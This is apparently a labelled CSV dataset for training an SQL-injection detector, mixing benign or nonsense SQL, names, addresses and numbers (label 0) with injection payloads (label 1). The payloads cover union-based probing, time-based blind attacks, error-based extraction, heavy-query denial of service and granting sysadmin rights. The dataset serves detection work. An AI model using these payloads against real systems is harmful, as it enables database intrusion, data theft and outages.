Query,Label
"SELECT column_name ( s ) FROM pot,spent",0
SELECT * FROM vast WHERE slide = 'known' LIMIT 3,0
"1' ) ) as ytfi where 3323 = 3323 and 8148 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",1
SELECT * FROM nervous WHERE broke = 'repeat' FETCH FIRST 3 ROWS ONLY,0
SELECT MIN ( tell ) AS difference FROM detail,0
select * from users where id = 1 + \+%$ or 1 = 1 -- 1,1
erill,0
SELECT AVG ( bone ) FROM bare SELECT SUM ( happily ),0
1'|| ( select 'dsjg' where 2402 = 2402 and 1947 = 7472--,1
"1%"" ) ) or char ( 75 ) ||char ( 70 ) ||char ( 99 ) ||char ( 83 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",1
zarrapastrosamente,0
"1' ) ) ) and 6510 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) and ( ( ( 'rfln' = 'rfln",1
"SELECT * FROM something ORDER BY weak ASC, sugar DESC",0
"-5013' ) ) ) or 1570 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 1570 = 1570 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( ( 'ehwh' like 'ehwh",1
"-7746' ) union all select 1998,1998,1998,1998,1998,1998,1998,1998#",1
1 ) ) waitfor delay '0:0:5' and ( ( 1636 = 1636,1
"1'+ ( select 'rpbx' where 6748 = 6748 and elt ( 4249 = 4249,7259 ) ) +'",1
16966742x,0
43896,0
SELECT police ( s ) FROM luck SELECT not FROM exist,0
SELECT AVG ( community ) FROM supper SELECT SUM ( spring ),0
hutchins@foreignoffice.sa,0
"1' ) as pkis where 3446 = 3446 or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) --",1
"select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and ( '%' = '",1
"-8159 where 2793 = 2793 union all select 2793,2793,2793,2793,2793#",1
SELECT AVG ( spider ) FROM group SELECT SUM ( appropriate ),0
6.65741E+15,0
salip altares,0
SELECT * FROM blow ORDER BY cattle,0
"exec sp_addsrvrolemember 'name' , 'sysadmin'",1
SELECT AVG ( train ) FROM park,0
"1"" ) ) as duny where 3756 = 3756 or 7427 = dbms_pipe.receive_message ( chr ( 116 ) ||chr ( 87 ) ||chr ( 90 ) ||chr ( 109 ) ,5 ) --",1
6411,0
SELECT * FROM plain WHERE whole = 'zoo' LIMIT 3,0
"SELECT hall, origin, becomingFROM wear WHERE hat IS NOT NULL",0
admin'1,1
"SELECT * FROM possibly ORDER BY concerned ASC, could DESC",0
"1'+ ( select 'swxi' where 7651 = 7651 and 6414 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) ) +'",1
piedramillera,0
"-3009'+ ( select 'gqbo' where 6915 = 6915 union all select 6915,6915--",1
SELECT * FROM supply WHERE nobody = 'discover' AND ( they = 'faster' OR us = 'practical' ),0
4341,0
1' where 8159 = 8159 union all select null#,1
"-7741' ) where 8271 = 8271 union all select 8271,8271,8271,8271,8271,8271,8271#",1
1 ) ) as oqui where 3368 = 3368 order by 1--,1
"1' ) where 3375 = 3375 or 8315 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",1
SELECT line ( s ) FROM dot INNER JOIN,0
SELECT LN ( 1 ) ;,0
1' and 7533 = 7533 and 'frvk' = 'frvk,1
SELECT Count ( * ) AS practice,0
34491,0
"SELECT instrument,pet FROM usually WHERE think = 'whose' UNION SELECT paper, free FROM larger",0
"1 ) and ( select 9067 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9067 = 9067,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a )",1
SELECT COUNT ( DISTINCT guess ) FROM stiff,0
"1' where 6905 = 6905 union all select null,null,null,null,null,null#",1
2946,0
mallejac,0
villasandino,0
"-8491"" where 6107 = 6107 or 4493 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4493 = 4493 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) --",1
sangborivutr@ssextremadura.gr,0
1'+ ( select 'wpnm' where 8223 = 8223 and 6240 = ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' ) ) +',1
"-6381%"" or 8571 = 8571--",1
SELECT * FROM chosen WHERE importance = 'nest' LIMIT 3,0
SELECT MIN ( jet ) AS money FROM transportation,0
SELECT 18 MOD 4;,0
"1' ) ) as kdwc where 5906 = 5906 union all select null,null,null,null,null,null,null,null,null--",1
"1' ) procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select ( case when ( 5840 = 5840 ) then 1 else 0 end ) ) ,0x717a767a71 ) ) ,1 ) and ( 'rxxb' = 'rxxb",1
SELECT * FROM willing WHERE fall = 'track' LIMIT 3,0
austriaca,0
"1"" ) ) ) and 3824 = benchmark ( 5000000,md5 ( 0x76555642 ) ) and ( ( ( ""enfu"" = ""enfu",1
"SELECT eatenID AS ID, at AS push FROM cap",0
"select * from users where id = 1 union select 1 $,version ( ) -- 1",1
"-1236'+ ( select 'fbgh' where 3896 = 3896 union all select 3896,3896,3896,3896,3896,3896,3896,3896,3896--",1
SELECT TOP 3 * FROM power WHERE answer = 'be' SELECT * FROM tube,0
SELECT DISTINCT announced FROM next,0
"1"" and make_set ( 8403 = 8403,8899 )",1
desc,1
"1 ) ) as rqbo where 2243 = 2243 and exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8190 = 8190,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) --",1
"INSERT INTO vote ( frame, more, from, date, simple, children ) VALUES ( 'stand', 'love'. upon', 'mill', 'if', 'system', 'deep' )",0
"c/ valladolid 194, 6?b",0
SELECT * FROM feed WHERE decide = 'promised' FETCH FIRST 3 ROWS ONLY,0
SELECT AVG ( visitor ) FROM dinner,0
19119,0
"-5652%' ) union all select 4447,4447,4447,4447,4447,4447,4447,4447,4447--",1
"1 where 3478 = 3478 ( select ( case when ( 4587 = 4587 ) then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) else char ( 76 ) ||char ( 65 ) ||char ( 102 ) ||char ( 72 ) end ) from ( values ( 0 ) ) ) --",1
SELECT * FROM wp_posts WHERE ID = 348492 LIMIT 1,0
"1"" and 4241 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 4241 = 4241 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ""vzud"" like ""vzud",1
SELECT wp_posts.* FROM wp_posts WHERE ID IN ( 367659 ),0
"1"" or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select ( elt ( 1297 = 1297,1 ) ) ) ,0x717a767a71 ) ) and ""gknn"" like ""gknn",1
"1%"" ) ) ) union all select null,null#",1
"1, ( select ( case when ( 8392 = 8404 ) then 1 else 8392* ( select 8392 from information_schema.character_sets ) end ) )",1
1464,0
reinazgo,0
"-2204'|| ( select 'bwae' from dual where 4884 = 4884 union all select 4884,4884,4884,4884,4884,4884,4884,4884,4884,4884#",1
1940,0
SELECT * FROM offer FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM dawn,0
"' AND (SELECT SUBSTRING(database(),1,1))='t' --",1
samieian7,0
SELECT DATE ( OrderDate ) FROM Orders;,0
"1"" or 2367 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",1
"-6453"" ) ) as hehs where 9363 = 9363 union all select 9363,9363,9363,9363,9363,9363,9363,9363,9363#",1
"1"" ) ) ) or char ( 68 ) ||char ( 69 ) ||char ( 97 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 5389 ) ,0 ) ,5000000000 ) ,null ) and ( ( ( ""vfoh"" = ""vfoh",1
SELECT AVG ( floor ) FROM safe SELECT SUM ( desk ),0
rayner,0
cancela arce,0
18449,0
de asbaje abarzuza,0
"SELECT metal,needs,nice FROM flow LEFT JOIN Orders ON many.spaceID = leg.quiet ORDER BY experience.stronger",0
1' ) ) ) and 3715 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 3715 = 3715 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( ( 'yxpi' = 'yxpi,1
85744372g,0
"1%"" ) ) ) and 8438 = 7620--",1
fuente el saz,0
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN ( 53815 ) ORDER BY meta_id ASC",0
montroy,0
9.26768E+15,0
-7707' ) ) union all select 3172#,1
SELECT * FROM enjoy WHERE Price NOT BETWEEN 10 AND 20,0
SELECT * FROM complex WHERE NOT nervous = 'slept' AND NOT real = 'pie',0
SELECT option_value FROM wp_options WHERE option_name = 'options_footer_button_3_text' LIMIT 1,0
1' ) ) ) and 2542 = 7042--,1
SELECT fewer ( s ) FROM life SELECT throughout FROM ear,0
"SELECT CHARACTER_LENGTH ( ""SQL Tutorial"" ) AS LengthOfString;",0
"1' and 6510 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 )",1
SELECT * FROM sat WHERE giving BETWEEN '1996-07-01' AND '1996-07-31',0
SELECT steam ( s ) FROM useful UNION ALL,0
"1, ( select ( case when ( 9644 = 9644 ) then dbms_pipe.receive_message ( chr ( 75 ) ||chr ( 78 ) ||chr ( 104 ) ||chr ( 98 ) ,5 ) else 1/ ( select 0 from dual ) end ) from dual )",1
"select pg_sleep ( 5 ) and ( ""pjql"" like ""pjql",1
"1 ) ) and elt ( 3114 = 3114,sleep ( 5 ) ) #",1
4574,0
5.56878E+15,0
SELECT * FROM bright FETCH FIRST 3 ROWS ONLY,0
1 ) as jdhz where 2021 = 2021,1
sureda bahamonde,0
"SELECT DATE_ADD ( ""2017-06-15"", INTERVAL -2 MONTH ) ;",0
32,0
1' ) as znak where 5203 = 5203,1
"1' in boolean mode ) union all select null,null,null,null,null,null,null,null,null#",1
"-4756"" ) ) union all select 6846,6846,6846,6846,6846,6846,6846#",1
tajamar,0
SELECT * FROM sudden WHERE ourselves = 'stairs' FETCH FIRST 3 ROWS ONLY,0
ferrs gortrez,0
"1 where 1062 = 1062 and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||char ( 88 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",1
SELECT COUNT ( escape ) FROM offer,0
SELECT AVG ( milk ) FROM class SELECT SUM ( college ),0
"pobla de segur 125,",0
SELECT option_value FROM wp_options WHERE option_name = 'options_number_of_support_family' LIMIT 1,0
"select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and ""vcup"" = ""vcup",1
SELECT * FROM acres WHERE began = 'who' FETCH FIRST 3 ROWS ONLY,0
"1"" ) where 3404 = 3404 and 8148 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",1
1' and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and 'toxr' like 'toxr,1
UPDATE suit SET nearer = 'share'WHERE decide = 'forth',0
manda,0
1' where 2690 = 2690,1
SELECT * FROM whose WHERE cookies NOT BETWEEN 'explain' AND 'strong',0
SELECT * FROM cake 3,0
SELECT * FROM advice WHERE curve IN ( SELECT mice FROM though ),0
-5555 ) ) as ldte where 4583 = 4583 order by 1#,1
SELECT soap ( s FROM exact RIGHT JOIN,0
mertin lombana,0
waitfor delay '0:0:5' and ( ( ( '%' = ',1
"-4811%' ) ) or 1570 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 1570 = 1570 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( '%' = '",1
"SELECT COUNT ( religious ) , team FROM go BY canal",0
SELECT * FROM sudden FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM soldier,0
"1%"" ) ) ) union all select null,null,null,null,null,null,null,null#",1
SELECT * FROM grandmother WHERE during LIKE '%blind%',0
SELECT * FROM die WHERE huge = 'prepare' FETCH FIRST 3 ROWS ONLY,0
5.35994E+15,0
SELECT * FROM hung WHERE that = 'immediately' OR find = 'search',0
"1"" where 1618 = 1618 or 8156 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",1
SELECT carried ( s ) FROM map LEFT JOIN,0
"1 ) where 8734 = 8734 procedure analyse ( extractvalue ( 9627,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x4b774c75 ) ) ) ) ) ,1 ) #",1
UPDATE sit SET silly = 'high'WHERE wealth = 'collect',0
"c/ santa clara 126, 6?e",0
"-2319 union all select 5068,5068,5068#",1
"UPDATE chart SET pleasant = 'diameter', City = 'post' WHERE get = diagram",0
SELECT * FROM active 3,0
1' ) ) as kgfp where 2366 = 2366,1
"select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 and ( ""pxbk"" like ""pxbk",1
"1 ) where 6082 = 6082 and ( select 9067 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9067 = 9067,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) --",1
-2960' or 2163 = 3143--,1
"select benchmark ( 5000000,md5 ( 0x4c4d6142 ) ) and ( ( ( 9847 = 9847",1
"1%"" ) ) union all select null,null,null,null,null,null,null--",1
"select * from users where id = 1.*\ union select null,@@VERSION -- 1",1
%27%20OR%201%3D1%20--,1
SELECT * FROM black ORDER BY seven,0
"SELECT apple,around,brief,traffic,product ( ( roll JOIN social ON magnet.immediately = fought.wait ) INNER JOIN citizenON Orders.promised = brief.gainID )",0
or '' ',1
SELECT * FROM studied WHERE route NOT LIKE 'chose%',0
"1"" where 3368 = 3368 and 9254 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",1
SELECT * FROM west WHERE studied BETWEEN luck09/01/1996nodded AND little15/31/1996front,0
c/ garcia benitez 40 6-a,0
1%' ) and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ( '%' = ',1
"select * from users where id = 1 or "" ( #"" or 1 = 1 -- 1",1
"select pg_sleep ( 5 ) and ( ""tpry"" = ""tpry",1
"1' ) ) ) or ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9173 = 9173,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) and ( ( ( 'ymad' like 'ymad",1
SELECT branch ( s ) FROM completely INNER JOIN,0
"select * from users where id = 1 +1 union select null,banner from v$version where rownum = 1 -- 1",1
or sleep ( __TIME__ ) #,1
"-2423' ) ) ) union all select 8256,8256,8256,8256,8256,8256,8256,8256--",1
( SELECT ProductID FROM OrderDetails WHERE Quantity = 10 ) ;,0
freiwald1,0
SELECT * FROM hour,0
"SELECT safetyID AS ID, row AS me FROM action",0
1 where 8095 = 8095,1
1'+ ( select 'vidl' where 9445 = 9445 and 5498 = 5777#,1
"isabelita ruiz, 31",0
select sleep ( 5 ) ) +',1
) or true--,1
"cami de almoster, 109,",0
SELECT something FROM completely UNION ALL SELECT broken FROM welcome ORDER BY lamp,0
SELECT * FROM wp_posts WHERE ID = 347696 LIMIT 1,0
SELECT * FROM near,0
"1"" ) ) or ( select * from ( select ( sleep ( 5 ) ) ) ydpu ) and ( ( ""knbx"" = ""knbx",1
"1' ) ) as hmyc where 6732 = 6732 and exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8190 = 8190,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) --",1
symen,0
"1"" ) ) as dfwi where 9703 = 9703 or 4915 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",1
SELECT * FROM citizen WHERE explanation = 'office' LIMIT 3,0
select ( case when ( 6045 = 2786 ) then 6045 else 1/ ( select 0 ) end ) --,1
"1' or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 1045 = 1045,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x ) and 'owwf' = 'owwf",1
"1%' ) ) ) ( select ( case when ( 4587 = 4587 ) then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) else char ( 76 ) ||char ( 65 ) ||char ( 102 ) ||char ( 72 ) end ) from ( values ( 0 ) ) ) and ( ( ( '%' = '",1
"1' ) ) ) and make_set ( 9514 = 8668,8668 ) and ( ( ( 'sgjj' like 'sgjj",1
"1"" ) ) as drss where 2077 = 2077 and 7533 = 7533--",1
SELECT COUNT ( both ) FROM divide,0
SELECT * FROM day WHERE out = 'function',0
"select * from users where id = 1 or @`\` union select 1,version ( ) -- 1",1
SELECT * FROM factory WHERE team = 'into',0
SELECT cage,0
union select * from users where login = char ...,1
"1"" ) as dgzf where 4834 = 4834",1
"1"" ) as htyo where 8322 = 8322 and 4595 = 4595#",1
"select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and ( ( ""swec"" like ""swec",1
9.17344E+15,0
-5995' ) ) or 6872 = 6872 and ( ( 'pywh' = 'pywh,1
"1 and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) )",1
"-8661"" union all select 5731,5731--",1
pimentel gatius,0
mendracaveitia torreyas,0
SELECT COUNT ( DISTINCT rich ) FROM him,0
"1 ) where 9213 = 9213 and 8189 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",1
"1"" where 5353 = 5353 and exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8190 = 8190,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) --",1
SELECT COUNT ( swam ) FROM this,0
1' ) and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( 'mptm' = 'mptm,1
SELECT * FROM bat WHERE NOT pictured = 'log' AND NOT yet = 'citizen',0
1 ) where 6039 = 6039 and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --,1
hi' or 'a' = 'a,1
sant llus,0
"-8557 or 1 group by concat ( 0x7171706a71, ( select ( case when ( 4232 = 4232 ) then 1 else 0 end ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) having min ( 0 ) #",1
"1 ) ) union all select null,null,null#",1
chismear,0
SELECT * FROM bar WHERE ants BETWEEN '1996-07-01' AND '1996-07-31',0
SELECT MIN ( taste ) AS involved FROM eight,0
"camio do monte 147, 10?h",0
cazallas caminal,0
1' ) waitfor delay '0:0:5',1
SELECT * FROM noon FETCH FIRST 50 PERCENT ROWS ONLY,0
1' or 6793 = ( select 6793 from pg_sleep ( 5 ) ) and 'dogx' = 'dogx,1
"1' and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||char ( 88 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and 'fjfo' = 'fjfo",1
SELECT COUNT ( wonder ) FROM use,0
SELECT TOP 3 * FROM gray WHERE tropical = 'son',0
"1%' or char ( 75 ) ||char ( 70 ) ||char ( 99 ) ||char ( 83 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",1
45789,0
"INSERT INTO highway ( cheese, age, pale ) VALUES ( 'gun', 'mix', 'fast' )",0
"1"" ) ) and extractvalue ( 7982,concat ( 0x5c,0x7171706a71, ( select ( elt ( 7982 = 7982,1 ) ) ) ,0x717a767a71 ) ) and ( ( ""gcyp"" like ""gcyp",1
1' ) or 4240 = ( select 4240 from pg_sleep ( 5 ) ) --,1
1' rlike ( select ( case when ( 1916 = 7874 ) then 1 else 0x28 end ) ) and 'ughq' = 'ughq,1
"SELECT A.CustomerName AS CustomerName1, B.CustomerName AS CustomerName2, A.City FROM Customers A, Customers B WHERE A.CustomerID <> B.CustomerID AND A.City = B.City ORDER BY A.City;",0
SELECT AVG ( you ) FROM reason SELECT SUM ( raw ),0
imperial 143,0
"select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and ( ""%"" = """,1
"calle joan salvat papasseit s/n,",0
"1'+ ( select jidy where 2989 = 2989 procedure analyse ( extractvalue ( 9627,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x4b774c75 ) ) ) ) ) ,1 ) #",1
1%' ) ) ) waitfor delay '0:0:5' and ( ( ( '%' = ',1
SELECT TOP 3 * FROM structure WHERE oldest = 'needs',0
) ) or sleep ( __TIME__ ) = ',1
or 1 in ( select @@version ) --,1
"-3930%"" ) ) order by 1#",1
"-1302"" ) ) as rshr where 2800 = 2800 or 4747 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4747 = 4747 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) --",1
"1' ) as elnu where 5719 = 5719 or 8156 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",1
"SELECT * FROM direction ORDER BY atom ASC, swimming DESC",0
"1%' ) ) or 7552 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) and ( ( '%' = '",1
"SELECT managed,afternoon,particularly,primitive,stop ( ( who JOIN follow ON length.sum = variety.ocean ) INNER JOIN cryON Orders.cake = cry.goldenID )",0
1' ) where 5307 = 5307,1
"-4745"" or 5903 = ( 'qqpjq'|| ( select case 5903 when 5903 then 1 else 0 end from rdb$database ) ||'qzvzq' ) and ""nifq"" like ""nifq",1
lovejoy,0
if ( 8858 = 5680 ) select 8858 else drop function pyuo--,1
1 ) ) as syot where 1199 = 1199,1
SELECT * FROM bicycle WHERE slabs = 'position' OR breathe = 'settlers',0
"waitfor delay '0:0:5' and ( ""%"" = """,1
vadell comalada,0
SELECT * FROM us 3,0
"1' ) union all select null,null,null,null,null,null,null,null,null,null--",1
SELECT select ( s ) FROM instead SELECT occur ( s ),0
SELECT agree FROM sink UNION SELECT brown FROM ill ORDER BY describe,0
SELECT TOP 3 * FROM musical,0
"select * from users where id = 1 or "";]"" or 1 = 1 -- 1",1
cambiazo,0
revill5,0
1'|| ( select 'aojt' from dual where 8499 = 8499,1
